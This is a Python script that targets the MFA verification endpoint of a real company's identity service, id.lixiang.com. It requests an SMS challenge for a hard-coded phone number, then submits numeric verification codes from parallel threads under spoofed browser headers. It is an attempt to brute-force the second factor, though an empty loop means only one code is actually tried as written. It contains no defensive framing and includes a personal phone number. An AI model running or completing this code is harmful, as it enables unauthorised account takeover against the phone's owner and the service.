#!/usr/bin/env python3

import requests
import threading

def reg(num="1000"):
    #global mycid
    #beijing =  mycid
    beijing = "BJ.6PZHGh3eK6J3eb5F7bAQnf"
    url = "https://id.lixiang.com/api/challenge/li_user:mfa_verify/" + beijing
    header = {}
    header['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    header['sec-ch-ua'] = '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"'
    header['sec-ch-ua-mobile'] = "?0"
    header['sec-ch-ua-platform'] = "Windows"
    param = {"verify_code":num}
    r = requests.post(url, headers=header, params=param)
    if r.status_code == 200:
        print(r.json())
    else:
        print(r.json())

def lixiang():
    url = "https://id.lixiang.com/api/challenge"
    header = {}
    header['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    header['sec-ch-ua'] = '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"'
    header['sec-ch-ua-mobile'] = "?0"
    header['sec-ch-ua-platform'] = "Windows"
    param = {}
    param['channel'] = "%2B8613141032576"
    param["channel_type"] = "mobile"
    param['audience'] = "1GDY9heeywMdHEEwDneHfx"
    param['client_id'] = "3TYuYfTkXK7dJDlVEosxgM" 
    param['type'] = "li_user%3Amfa_verify"
    r = requests.post(url, headers=header, data=param)
    if r.status_code == 200:
        print(r.json())
        return r.json()['cid']
    else:
        print(r.json())




if __name__ == "__main__":
    #mycid = lixiang()
    reg()
    tmp = 1000
    threadingPool = []
    for j in range(0,0,50):
        print(j)
        for i in range(tmp,tmp + j):
            tmp = i
            #print(i)
            t = threading.Thread(target=reg,args=(i,))
            threadingPool.append(t)
            t.start()
    for k in threadingPool:
        k.join()
